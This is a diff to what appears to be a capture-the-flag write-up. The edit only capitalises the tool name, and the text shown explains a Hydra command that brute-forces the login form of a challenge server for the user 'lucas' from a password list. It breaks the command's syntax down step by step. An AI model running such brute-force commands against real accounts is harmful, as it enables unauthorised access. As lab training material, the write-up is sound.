@@ -80,19 +80,19 @@ Syntax (simplified):
 hydra [-l LOGIN | -L FILE] [-p PASS | -P FILE] [service://server[:PORT][/OPT]]
 ```
 
-Assume that the username is `lucas` for this search. The hydra command will look like this:
+Assume that the username is `lucas` for this search. The Hydra command will look like this:
 ```
 $ hydra -l lucas -P lucas.txt "http-post-form://challenges.laptophackingcoffee.org:3199/secret.php:username=^USER^&password=^PASS^&login=Submit:failed" -V
 ```
 
-A few key notes about hydra's syntax:
-* `^USER^` is a keyword hydra uses that is replaced at runtime with the data given in the `-l` or `-L` options. Likewise, `^PASS^` is a keyword replaced with the data in the `-p` or `-P` options. 
+A few key notes about Hydra's syntax:
+* `^USER^` is a keyword Hydra uses that is replaced at runtime with the data given in the `-l` or `-L` options. Likewise, `^PASS^` is a keyword replaced with the data in the `-p` or `-P` options. 
 * The entire portion containing the `[service://server[:PORT][/OPT]` must be contained in double quotes (`"`).
-* The `:failed` portion towards the end of the command is what hydra looks for to check if the login failed. The word `failed` is from Lucas's failed login page which simply says: "Login failed!"
+* The `:failed` portion towards the end of the command is what Hydra looks for to check if the login failed. The word `failed` is from Lucas's failed login page which simply says: "Login failed!"
 
 With all this in mind, the above command breaks down like this:
 ```
-hydra                                   run the hydra program
+hydra                                   run the Hydra program
 -l lucas                                set the login (username) to lucas
 -P lucas.txt                            use lucas.txt as the password file
 http-post-form://                       use HTTP POST service
